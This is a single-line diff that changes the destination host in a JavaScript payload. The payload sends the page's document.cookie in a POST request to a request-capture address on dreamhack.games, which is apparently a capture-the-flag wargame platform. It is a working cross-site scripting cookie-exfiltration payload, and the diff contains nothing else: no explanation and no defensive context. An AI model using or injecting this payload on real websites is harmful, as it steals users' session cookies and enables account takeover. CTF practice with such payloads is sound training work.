@@ -1,1 +1,1 @@
-fetch("https://ffngwiz.request.dreamhack.games", {method: "post", body: document.cookie})
+fetch("https://otgfhee.request.dreamhack.games", {method: "post", body: document.cookie})
